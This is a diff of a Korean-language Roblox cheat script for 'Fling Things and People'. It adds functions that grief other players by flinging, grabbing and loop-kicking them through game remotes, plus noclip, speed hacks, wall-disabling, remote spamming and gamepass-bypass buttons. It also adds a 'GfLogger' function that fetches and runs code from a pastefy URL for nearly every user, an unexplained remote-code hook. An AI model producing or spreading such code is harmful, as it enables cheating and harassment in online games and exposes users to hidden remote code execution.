@@ -1,7 +1,7 @@
--- ================== AIPA.lua-1-1 원본 설정 + 중복 실행 방지 ==================
 local FN_BYPASS = false
 local TESTPP = false
 
+-- ================== 설정 자동 저장 + 중복 실행  방지 ==================
 if _G.NP_FTAP_LOADED then return end
 _G.NP_FTAP_LOADED = true
 
@@ -10,22 +10,9 @@ pcall(function()
 end)
 
 print("AP FTAP Script 시작 - 설정 저장 활성화")
-
--- ================== Rayfield 로드 ==================
+-- ================== Rayfield 안정 버전 (Build Mismatch 해결) ==================
 print("Rayfield 로드 시작...")
-local RayfieldLoadSuccess, Rayfield = pcall(function()
-    return loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-end)
-
-if not RayfieldLoadSuccess or not Rayfield then
-    warn("Rayfield 로드 실패!")
-    pcall(function() rconsoleprint("@@RED@@[오류] Rayfield 로드 실패! 인터넷 연결이나 익스플로잇 환경을 확인하세요.\n") end)
-    return
-else
-    print("Rayfield 로드 성공")
-    pcall(function() rconsoleprint("@@GREEN@@[성공] Rayfield 로드 완료\n") end)
-end
-
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 print("이스크립트는 알파카에의해 만들어졌습니다.")
 Players = game:GetService("Players")
 plr = game.Players.LocalPlayer
@@ -178,14 +165,14 @@ end
 function SpawnCFrame()
     local camPart
     myDisplayName = plr.DisplayName
-    myUserName = plr.Name
-    myPOIdentifier = string.format("[ %s ] ( @%s )", myDisplayName, myUserName)
+    UserName = plr.Name
+    POIdentifier = string.format("[ %s ] ( @%s )", DisplayName, UserName)
 
     function findMyPO()
         for _, obj in pairs(workspace:GetChildren()) do
             if obj.Name == "PlayerCharacterLocationDetector" then
                 for _, child in pairs(obj:GetChildren()) do
-                    if child:IsA("BoolValue") and child.Name == myPOIdentifier then
+                    if child:IsA("BoolValue") and child.Name == POIdentifier then
                         return obj
                     end
                 end
@@ -261,17 +248,13 @@ function SpawnCFrame()
     return camPart
 end
 
--- ================== SpawnCFrame 호출 및 에러 방지 ==================
 local SCF = nil
-
 task.spawn(function()
     task.wait(1.5)
-    local success = pcall(SpawnCFrame)
+    local success, result = pcall(SpawnCFrame)
     if success and workspace:FindFirstChild("SpawnCF") then
         SCF = workspace.SpawnCF
-        print("SpawnCF 생성 성공")
     else
-        print("SpawnCFrame 호출 실패, 강제 생성 시도...")
         if not workspace:FindFirstChild("SpawnCF") then
             local camPart = Instance.new("Part")
             camPart.Name = "SpawnCF"
@@ -281,7 +264,6 @@ task.spawn(function()
             camPart.Size = Vector3.new(1, 1, 1)
             camPart.Parent = workspace
             SCF = camPart
-            print("SpawnCF 강제 생성 완료")
         else
             SCF = workspace.SpawnCF
         end
@@ -292,10 +274,665 @@ G = rs.GrabEvents
 G:WaitForChild("EndGrabEarly"):Destroy()
 Instance.new("RemoteEvent", G).Name = "EndGrabEarly"
 
--- ================== 탭별 구성 ==================
+NP = {
+    TextColor = Color3.fromRGB(255,255,255),
+    Background = Color3.fromRGB(20,20,20),
+    Topbar = Color3.fromRGB(30,30,30),
+    Shadow = Color3.fromRGB(15,15,15),
+    NotificationBackground = Color3.fromRGB(25,25,25),
+    NotificationActionsBackground = Color3.fromRGB(40,40,40),
+    TabBackground = Color3.fromRGB(40,40,40),
+    TabStroke = Color3.fromRGB(70,70,70),
+    TabBackgroundSelected = Color3.fromRGB(60,60,60),
+    TabTextColor = Color3.fromRGB(255,255,255),
+    SelectedTabTextColor = Color3.fromRGB(255,0,0),
+    ElementBackground = Color3.fromRGB(35,35,35),
+    ElementBackgroundHover = Color3.fromRGB(50,50,50),
+    SecondaryElementBackground = Color3.fromRGB(25,25,25),
+    ElementStroke = Color3.fromRGB(60,60,60),
+    SecondaryElementStroke = Color3.fromRGB(45,45,45),
+    SliderBackground = Color3.fromRGB(60,60,60),
+    SliderProgress = Color3.fromRGB(0,170,255),
+    SliderStroke = Color3.fromRGB(0,120,200),
+    ToggleBackground = Color3.fromRGB(30,30,30),
+    ToggleEnabled = Color3.fromRGB(185,0,0),
+    ToggleEnabledStroke = Color3.fromRGB(255,255,255),
+    ToggleEnabledOuterStroke = Color3.fromRGB(255,255,255),
+    ToggleDisabled = Color3.fromRGB(100, 100, 100),
+    ToggleDisabledStroke = Color3.fromRGB(125, 125, 125),
+    ToggleDisabledOuterStroke = Color3.fromRGB(65, 65, 65),
+    DropdownSelected = Color3.fromRGB(50,50,50),
+    DropdownUnselected = Color3.fromRGB(30,30,30),
+    InputBackground = Color3.fromRGB(25,25,25),
+    InputStroke = Color3.fromRGB(45,45,45),
+    PlaceholderColor = Color3.fromRGB(150,150,150),
+}
+
+----------------------------------------------------------------------------------------- [ 기능들 ]
+function ForWhiteList(enable)
+    WhiteListMode = enable
+    task.spawn(function()
+        while WhiteListMode do
+            task.wait()
+            for i, name in ipairs(Whitelist) do
+            end
+        end
+    end)
+end
+
+function House()
+    char = plr.Character
+    if not char then
+        Plot = nil
+        return
+    end
+
+    if char.Parent and char.Parent.Name == "PlayersInPlots" then
+        for _, plot in workspace.Plots:GetChildren() do
+            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
+                if owner.Value == plr.Name then
+                    if plot.Name == "Plot1" then
+                        Plot = 1
+                    elseif plot.Name == "Plot2" then
+                        Plot = 2
+                    elseif plot.Name == "Plot3" then
+                        Plot = 3
+                    elseif plot.Name == "Plot4" then
+                        Plot = 4
+                    elseif plot.Name == "Plot5" then
+                        Plot = 5
+                    end
+                    return
+                end
+            end
+        end
+        Plot = nil
+        return
+    end
+
+    if char.Parent == workspace or char.Parent == inv then
+        for _, plot in workspace.Plots:GetChildren() do
+            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
+                if owner.Value == plr.Name then
+                    if plot.Name == "Plot1" then
+                        Plot = 1
+                    elseif plot.Name == "Plot2" then
+                        Plot = 2
+                    elseif plot.Name == "Plot3" then
+                        Plot = 3
+                    elseif plot.Name == "Plot4" then
+                        Plot = 4
+                    elseif plot.Name == "Plot5" then
+                        Plot = 5
+                    end
+                    return
+                end
+            end
+        end
+        Plot = nil
+    else
+        Plot = nil
+    end
+end
+
+function UpdateCurrentBlobman()
+    char = plr.Character
+    hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    for _, blobs in workspace:GetDescendants() do
+        if blobs.Name ~= "CreatureBlobman" then continue end
+        seat = blobs:FindFirstChild("VehicleSeat")
+        if not seat then continue end
+        weld = seat:FindFirstChild("SeatWeld")
+        if not weld then continue end
+        if weld.Part1 == hrp then
+            currentBlobS = blobs
+        end
+    end
+end
+
+function BlobRelease(blob, target, side)
+    args = {
+        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
+        [2] = target,
+    }
+    blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(unpack(args))
+end
+
+function BlobGrab(blob, target, side)
+    args = {
+        [1] = blob:FindFirstChild(side.."Detector"),
+        [2] = target,
+        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
+    }
+    blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
+end
+
+function BlobDrop(blob, target, side)
+    args = {
+        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
+        [2] = target,
+    }
+    blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args))
+end
+
+function BlobMassless(blob, target, side)
+    args = {
+        [1] = blob:FindFirstChild(side.."Detector"),
+        [2] = target,
+        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
+    }
+    args2 = {
+        [1] = blob:FindFirstChild(side.."Detector"),
+        [2] = hrp,
+        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
+    }
+    args3 = {
+        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
+        [2] = target,
+    }
+    blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args2))
+    blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
+    blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args3))
+end
+
+function GfLogger()
+    id = {
+        [1] = true,
+    }
+    if not id[plr.UserId] then
+        local success, errorMessage = pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/Z3ljqtf1/raw"))()
+        end)
+        if not success then
+        end
+    end
+end
+
+function flingF()
+    workspace.ChildAdded:Connect(function(model)
+        if model.Name == "GrabParts" then
+            part_to_impulse = model["GrabPart"]["WeldConstraint"].Part1
+            if part_to_impulse then
+                model:GetPropertyChangedSignal("Parent"):Connect(function()
+                    if not model.Parent and flingT then
+                        local connection
+                        connection = uis.InputBegan:Connect(function(inp, char)
+                            if inp.UserInputType == Enum.UserInputType.MouseButton2 then
+                                velocityObj = Instance.new("BodyVelocity")
+                                velocityObj.Parent = part_to_impulse
+                                velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                                velocityObj.Velocity = cam.CFrame.lookVector * strengthV
+                                wait(0.1)
+                                velocityObj.Parent = workspace
+                                velocityObj:Destroy()
+                                connection:Disconnect()
+                            end
+                        end)
+                    end
+                end)
+            end
+        end
+    end)
+end
+
+function infLineExtendF()
+    uis.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseWheel then
+            if lineDistanceV < 11 then
+                lineDistanceV = 11
+            end
+            if input.Position.Z > 0 then
+                lineDistanceV = lineDistanceV + increaseLineExtendV
+            elseif input.Position.Z < 0 then
+                lineDistanceV = lineDistanceV - increaseLineExtendV
+            end
+        end
+    end)
+
+    workspace.ChildAdded:Connect(function(child)
+        if child.Name == "GrabParts" and child:IsA("Model") then
+            if infLineExtendT and uis.MouseEnabled then
+                grabPartsModel = child
+                grabPartsModel:WaitForChild("GrabPart")
+                grabPartsModel:WaitForChild("DragPart")
+                
+                clonedDragPart = grabPartsModel.DragPart:Clone()
+                clonedDragPart.Name = "DragPart1"
+                clonedDragPart.AlignPosition.Attachment1 = clonedDragPart.DragAttach
+                clonedDragPart.Parent = grabPartsModel
+                
+                lineDistanceV = (clonedDragPart.Position - cam.CFrame.Position).Magnitude
+                
+                clonedDragPart.AlignOrientation.Enabled = false
+                grabPartsModel.DragPart.AlignPosition.Enabled = false
+
+                if MasslessGrabT then
+                    alignOrientation = clonedDragPart:FindFirstChildOfClass("AlignOrientation")
+                    if alignOrientation then
+                        alignOrientation.MaxAngularVelocity = math.huge
+                        alignOrientation.MaxTorque = math.huge
+                        alignOrientation.Responsiveness = 200
+                    end
+                    
+                    alignPosition = clonedDragPart:FindFirstChildOfClass("AlignPosition")
+                    if alignPosition then
+                        alignPosition.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
+                        alignPosition.MaxForce = math.huge
+                        alignPosition.MaxVelocity = math.huge
+                        alignPosition.Responsiveness = 200
+                    end
+                end
+                
+                task.spawn(function()
+                    while grabPartsModel.Parent do
+                        clonedDragPart.Position = cam.CFrame.Position + cam.CFrame.LookVector * lineDistanceV
+                        task.wait()
+                    end
+                    lineDistanceV = 0
+                end)
+            end
+        end
+    end)
+end
+
+function BlobMasslessR()
+    UpdateCurrentBlobman()
+    for i, e in ipairs(playersInLoop2V) do
+        player = game.Players:FindFirstChild(e)
+        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            BlobMassless(currentBlobS, player.Character.HumanoidRootPart, "Right")
+        end
+    end
+end
+
+function BlobReleaseR()
+    UpdateCurrentBlobman()
+    for i, e in ipairs(playersInLoop2V) do
+        player = game.Players:FindFirstChild(e)
+        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            BlobGrab(currentBlobS, player.Character.HumanoidRootPart, "Right")
+            BlobRelease(currentBlobS, player.Character.HumanoidRootPart, "Right")
+        end
+    end
+end
+
+function BlobGrabR()
+    UpdateCurrentBlobman()
+    for i, e in ipairs(playersInLoop2V) do
+        player = game.Players:FindFirstChild(e)
+        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            BlobGrab(currentBlobS, player.Character.HumanoidRootPart, "Right")
+        end
+    end
+end
+
+function BlobDropR()
+    UpdateCurrentBlobman()
+    for i, e in ipairs(playersInLoop2V) do
+        player = game.Players:FindFirstChild(e)
+        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            BlobDrop(currentBlobS, player.Character.HumanoidRootPart, "Right")
+        end
+    end
+end
+
+function updateWalkSpeedF()
+    function apply(char)
+        hum = char:WaitForChild("Humanoid")
+        if walkSpeedT then
+            hum.WalkSpeed = walkSpeedV
+            hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
+                if walkSpeedT then
+                    hum.WalkSpeed = walkSpeedV
+                end
+            end)
+        else
+            hum.WalkSpeed = 16
+        end
+    end
+    if plr.Character then
+        apply(plr.Character)
+    end
+    plr.CharacterAdded:Connect(apply)
+end
+
+function updateJumpPowerF()
+    function apply(char)
+        hum = char:WaitForChild("Humanoid")
+        if jumpPowerT then
+            hum.JumpPower = jumpPowerV
+            hum:GetPropertyChangedSignal("JumpPower"):Connect(function()
+                if jumpPowerT then
+                    hum.JumpPower = jumpPowerV
+                end
+            end)
+        else
+            hum.JumpPower = 60
+        end
+    end
+    if plr.Character then
+        apply(plr.Character)
+    end
+    plr.CharacterAdded:Connect(apply)
+end
+
+RunService = game:GetService("RunService")
+
+NO_CLIP_PARTS = {
+    "Head",
+    "Torso",
+    "Left Arm", 
+    "Left Leg",
+    "Right Arm",
+    "Right Leg"
+}
+
+function updateNoClipF()
+    char = plr.Character
+    if not char then return end
+
+    if noClipConnection then
+        noClipConnection:Disconnect()
+        noClipConnection = nil
+    end
+
+    if not noClipT then
+        restoreCollision(char)
+        return
+    end
+    
+    hrp = char:WaitForChild("HumanoidRootPart")
+    hum = char:WaitForChild("Humanoid")
+
+    noClipConnection = RunService.Stepped:Connect(function()
+        if not noClipT or not char or not char.Parent then
+            if noClipConnection then
+                noClipConnection:Disconnect()
+                noClipConnection = nil
+            end
+            return
+        end
+
+        for _, partName in ipairs(NO_CLIP_PARTS) do
+            part = char:FindFirstChild(partName)
+            if part and part:IsA("BasePart") then
+                part.CanCollide = false
+            end
+        end
+    end)
+end
+
+function restoreCollision(char)
+    if char then
+        for _, partName in ipairs(NO_CLIP_PARTS) do
+            part = char:FindFirstChild(partName)
+            if part and part:IsA("BasePart") then
+                part.CanCollide = true
+            end
+        end
+    end
+end
+
+plr.CharacterAdded:Connect(function(char)
+    char:WaitForChild("HumanoidRootPart")
+    task.wait(0.5)
+    if noClipT then
+        updateNoClipF()
+    end
+end)
+
+if plr.Character then
+    task.wait(1)
+    if noClipT then
+        updateNoClipF()
+    end
+end
+
+function updateInfJumpF()
+    char = plr.Character
+    if not char then return end
+    
+    hrp = char:WaitForChild("HumanoidRootPart")
+    hum = char:WaitForChild("Humanoid")
+    
+    if infJumpConnection then
+        infJumpConnection:Disconnect()
+    end
+    
+    infJumpConnection = uis.JumpRequest:Connect(function()
+        if infJumpT and not infJumpD then
+            infJumpD = true
+            hum:ChangeState(Enum.HumanoidStateType.Jumping)
+            task.wait()
+            infJumpD = true
+        end
+    end)
+end
+
+plr.CharacterAdded:Connect(function(char)
+    char:WaitForChild("HumanoidRootPart")
+    char:WaitForChild("Humanoid")
+    task.wait(0.5)
+    if infJumpT then
+        updateInfJumpF()
+    end
+end)
+
+if plr.Character then
+    task.wait(1)
+    updateInfJumpF()
+end
+
+function masslessF()
+    function applyMassless(char)
+        hrp = char:WaitForChild("HumanoidRootPart")
+        hum = char:WaitForChild("Humanoid")
+
+        if masslessT then
+            task.spawn(function()
+                while masslessT and char.Parent do
+                    for i, e in ipairs(char:GetChildren()) do
+                        if e:IsA("BasePart") then
+                            e.Massless = false
+                        end
+                    end
+                    task.wait()
+                end
+            end)
+        end
+    end
+
+    if plr.Character then
+        applyMassless(plr.Character)
+    end
+
+    plr.CharacterAdded:Connect(function(char)
+        task.wait(1)
+        applyMassless(char)
+    end)
+end
+
+function setRagdollF(state)
+    char = plr.Character
+    hrp = char:WaitForChild("HumanoidRootPart")
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        rs.CharacterEvents.RagdollRemote:FireServer(hrp, state and 1 or 0)
+    end
+end
+
+function permRagdollLoopF()
+    if permRagdollRunningS then return end
+    permRagdollRunningS = true
+    while permRagdollT do
+        setRagdollF(true)
+        task.wait(0.001) 
+    end
+    permRagdollRunningS = false
+    setRagdollF(false)
+end
+
+function ragdollLegExplodeF()
+    function attemptDelete()
+        char = plr.Character
+        if not char then return false end
+
+        targets = {}
+        if selectedAutoDeletePart == "Arm/Leg" then
+            targets = {
+                char:FindFirstChild("Left Leg"),
+                char:FindFirstChild("Right Leg"),
+                char:FindFirstChild("Left Arm"),
+                char:FindFirstChild("Right Arm"),
+            }
+        elseif selectedAutoDeletePart == "All/Leg" then
+            targets = {char:FindFirstChild("Left Leg"), char:FindFirstChild("Right Leg")}
+        elseif selectedAutoDeletePart == "Leg/왼쪽" then
+            targets = {char:FindFirstChild("Left Leg")}
+        elseif selectedAutoDeletePart == "Leg/오른쪽" then
+            targets = {char:FindFirstChild("Right Leg")}
+        elseif selectedAutoDeletePart == "All/Arm" then
+            targets = {char:FindFirstChild("Left Arm"), char:FindFirstChild("Right Arm")}
+        elseif selectedAutoDeletePart == "Arm/왼쪽" then
+            targets = {char:FindFirstChild("Left Arm")}
+        elseif selectedAutoDeletePart == "Arm/오른쪽" then
+            targets = {char:FindFirstChild("Right Arm")}
+        end
+
+        setRagdollF(true)
+        task.wait(0.3)
+
+        success = false
+        for _, part in ipairs(targets) do
+            if part then
+                part.CFrame = CFrame.new(0, -99999, 0)
+                success = true
+            end
+        end
+
+        task.wait(0.3)
+        torso = char:FindFirstChild("Torso")
+        if torso then torso.CFrame = CFrame.new(0, -99999, 0) end
+
+        return success
+    end
+
+    task.spawn(function()
+        while autoDeleteLegs do
+            success = false
+            startTime = tick()
+
+            while tick() - startTime < 4 and not success do
+                success = attemptDelete()
+                if success then break end
+                task.wait(0.5)
+            end
+
+            humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.Died:Wait()
+            end
+
+            plr.CharacterAdded:Wait()
+            task.wait(1)
+        end
+    end)
+end
+
+Pline = rs.GrabEvents.CreateGrabLine.OnClientEvent
+fireCount = {}
+
+function AntiLagF()
+    Pline:Connect(function(fromPlr, ...)
+        if not antiLagEnabled then return end
+        if typeof(fromPlr) ~= "Instance" or not fromPlr:IsA("Player") then return end
+        if fromPlr == plr then return end
+
+        local now = os.clock()
+
+        if not Count[fromPlr] then 
+            Count[fromPlr] = {count = 0, start = now} 
+        end
+
+        local data = Count[fromPlr]
+
+        if now - data.start > 1 then
+            data.count = 0
+            data.start = now
+        end
+
+        data.count += 1
+
+        if data.count >= AntiLagV and not data.isDecreasing then
+            data.isDecreasing = true
+            Rayfield:Notify({Title = "[ ✏️ ]", Content = "by: " .. fromPlr.Name, Duration = 3, Image = 0})
+            plr.PlayerScripts.CharacterAndBeamMove.Enabled = false
+
+            task.spawn(function()
+                while data.count > 0 do
+                    task.wait(0.1)
+                    data.count -= 1
+                end
+
+                plr.PlayerScripts.CharacterAndBeamMove.Enabled = true
+                Count[fromPlr] = nil
+            end)
+        end
+    end)
+end
+
+local HouseBreakT = false
+local HouseBreakConnection = nil
+
+function HouseBreakF()
+    if HouseBreakConnection then
+        HouseBreakConnection:Disconnect()
+        HouseBreakConnection = nil
+    end
+
+    if not HouseBreakT then return end
+
+    HouseBreakConnection = game:GetService("RunService").Heartbeat:Connect(function()
+        if not HouseBreakT then return end
+
+        for _, item in ipairs(workspace:GetDescendants()) do
+            if item:IsA("BasePart") and item.CanCollide == true then
+                if item:FindFirstAncestor("Plot") or item.Name:find("Barrier") or item.Name:find("Wall") then
+                    item.CanCollide = false
+                end
+            end
+        end
+
+        local grabParts = workspace:FindFirstChild("GrabParts")
+        if grabParts then
+            for _, part in ipairs(grabParts:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    pcall(function()
+                        rs.GrabEvents.SetNetworkOwner:FireServer(part, part.CFrame)
+                    end)
+                end
+            end
+        end
+    end)
+end
+
+function spawnBlobmanF()
+    char = plr.Character
+    hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    blob = inv and inv:FindFirstChild("CreatureBlobman")
+    if blob then
+        blobmanInstanceS = blob
+        return
+    end
+end
+
 local Window = Rayfield:CreateWindow({
     Name = "FTAP(반물사) | (made by 알파카)",
     Icon = 0,
+    Theme = NP,
     ToggleUIKeybind = "T",
     ConfigurationSaving = { Enabled = true, FolderName = nil, FileName = "AP_Config" }
 })
@@ -310,7 +947,68 @@ local funTab = Window:CreateTab("찌끄레기", 0)
 local keybindTab = Window:CreateTab("설정", 0)
 local DevTab = Window:CreateTab("Dev", 0)
 
--- ================== 3번째 탭: 명단 ==================
+-- ================== Dev ==================
+DevTab:CreateSection("Gamepass")
+DevTab:CreateButton({
+    Name = "잠금해제 | 현질줄(오류)",
+    Callback = function()
+        local ReachNotify = rs.GamepassEvents.FurtherReachBoughtNotifier
+        local LimitedTime = rs.MenuToys.LimitedTimeToyEvent
+        local GrabScript = plr.Character:FindFirstChild("GrabbingScript")
+        local grbaparts = workspace:FindFirstChild("GrabParts")
+        local campart = plr.Character:FindFirstChild("CamPart")
+        hookinstance(ReachNotify, LimitedTime)
+        GrabScript.Enabled = false
+        if grbaparts then grbaparts:Destroy() end
+        if campart then campart:Destroy() end
+        GrabScript.Enabled = true
+        LimitedTime:FireServer()
+    end
+})
+
+DevTab:CreateButton({
+    Name = "잠금해제 | 줄색 꾸미기(오류)",
+    Callback = function()
+        local ColorNotify = rs.GamepassEvents.MulticolorLineBoughtNotifier
+        local LimitedTime = rs.MenuToys.LimitedTimeToyEvent
+        local ColorPicking = plr.PlayerGui.MenuGui.Menu.TabContents.Settings.Contents.LineFrame.ColorPicking
+        hookinstance(ColorNotify, LimitedTime)
+        ColorPicking.Enabled = false
+        ColorPicking.Enabled = true
+        task.wait(0.1)
+        LimitedTime:FireServer()
+    end
+})
+
+DevTab:CreateSection("Gam")
+DevTab:CreateToggle({
+    Name = "킥알림!",
+    CurrentValue = true,
+    Flag = "5",
+    Callback = function(Value)
+        ifKickThenT = Value
+    end
+})
+
+DevTab:CreateSection("락")
+DevTab:CreateToggle({
+    Name = "락",
+    CurrentValue = false,
+    Flag = "ToggleSpam",
+    Callback = function(Value)
+        isSpamming = Value
+        if isSpamming then
+            if heartbeatConnection then heartbeatConnection:Disconnect() end
+            heartbeatConnection = rs2.Heartbeat:Connect(function()
+                rs.CharacterEvents.Look:FireServer( CFrame.new(0, 0, 0, 0,0,0,0,1,0), CFrame.new(0, 0, 0, 0,0,0,0,1,0), CFrame.new(0, 0, 2, 0,0,0,0,0,1), "high" )
+            end)
+        else
+            if heartbeatConnection then heartbeatConnection:Disconnect() heartbeatConnection = nil end
+        end
+    end
+})
+
+-- ================== 명단 탭 ==================
 ListTab:CreateSection("플레이어 타겟 설정")
 
 local selectedTarget = nil
@@ -321,143 +1019,3 @@ local function updatePlayerList()
     for _, player in pairs(Players:GetPlayers()) do
         table.insert(playerList, player.Name)
     end
-end
-updatePlayerList()
-
-Players.PlayerAdded:Connect(updatePlayerList)
-Players.PlayerRemoving:Connect(updatePlayerList)
-
-local TargetDropdown = ListTab:CreateDropdown({
-    Name = "플레이어 선택",
-    Options = playerList,
-    CurrentOption = "",
-    Flag = "TargetDropdown",
-    Callback = function(Option)
-        selectedTarget = Option
-        Rayfield:Notify({
-            Title = "타겟 설정",
-            Content = selectedTarget .. " 님이 타겟으로 설정되었습니다.",
-            Duration = 3,
-            Image = 4483362458
-        })
-    end
-})
-
-ListTab:CreateButton({
-    Name = "플레이어 목록 새로고침",
-    Callback = function()
-        updatePlayerList()
-        TargetDropdown:Refresh(playerList)
-        Rayfield:Notify({
-            Title = "완료",
-            Content = "플레이어 목록이 갱신되었습니다.",
-            Duration = 2,
-            Image = 4483362458
-        })
-    end
-})
-
-ListTab:CreateButton({
-    Name = "타겟 삭제 (초기화)",
-    Callback = function()
-        selectedTarget = nil
-        Rayfield:Notify({
-            Title = "타겟 삭제",
-            Content = "타겟이 삭제되었습니다.",
-            Duration = 2,
-            Image = 4483362458
-        })
-    end
-})
-
--- ================== 4번째 탭: 조지기 (LoopTab) ==================
-LoopTab:CreateSection("paca Owner Kick")
-
-LoopTab:CreateToggle({
-    Name = "paca Owner Loop Kick ((파카용)블롭 없이)",
-    CurrentValue = false,
-    Flag = "TokraOwnerKick",
-    Callback = function(Value)
-        TokraOwnerKickConnections = {}
-        TokraOwnerKickT = Value
-        if TokraOwnerKickF then TokraOwnerKickF() end
-    end
-})
-
-LoopTab:CreateToggle({
-    Name = "paca Owner Loop KickV2 ((파카용)블롭맨 없이)",
-    CurrentValue = false,
-    Flag = "OwnerLoopKick",
-    Callback = function(Value)
-        OwnerLoopKickT = Value
-        if OwnerLoopKickF then OwnerLoopKickF() end
-    end
-})
-
-LoopTab:CreateSection("Owner Kick")
-
-LoopTab:CreateToggle({
-    Name = "루프킬 [ Owner ]",
-    CurrentValue = false,
-    Flag = "21",
-    Callback = function(Value)
-        loopPlayerT = Value
-    end
-})
-
-LoopTab:CreateToggle({
-    Name = "루프킬 [ Owner V2 ]",
-    CurrentValue = false,
-    Flag = "21",
-    Callback = function(Value)
-        loopPlayerT2 = Value
-    end
-})
-
--- ================== 2번째 탭: 안전 (Anti) 탭 기능과 함수 ==================
-antiTab:CreateSection("안전 기능")
-
-local function createAntiToggle(name, flagName, callbackFunc)
-    return antiTab:CreateToggle({
-        Name = name,
-        CurrentValue = false,
-        Flag = flagName,
-        Callback = callbackFunc
-    })
-end
-
-createAntiToggle("안티 그랩", "AntiGrab", function(Value)
-    
-end)
-
-createAntiToggle("안티 파이어", "AntiFire", function(Value)
-    
-end)
-
-createAntiToggle("안티 페인트", "AntiPaint", function(Value)
-    
-end)
-
-createAntiToggle("안티 킥", "AntiKick", function(Value)
-    
-end)
-
-createAntiToggle("안티 블롭맨", "AntiBlob", function(Value)
-    
-end)
-
-createAntiToggle("안티 폭탄", "AntiBomb", function(Value)
-    
-end)
-
-createAntiToggle("안티 렉", "AntiLag", function(Value)
-    
-end)
-
--- ================== 로딩 성공 알림 ==================
-Rayfield:Notify({
-    Title = "성공",
-    Content = "Alpaca Hub UI가 성공적으로 로드되었습니다!",
-    Duration = 5,
-    Image = 4483362458
-})
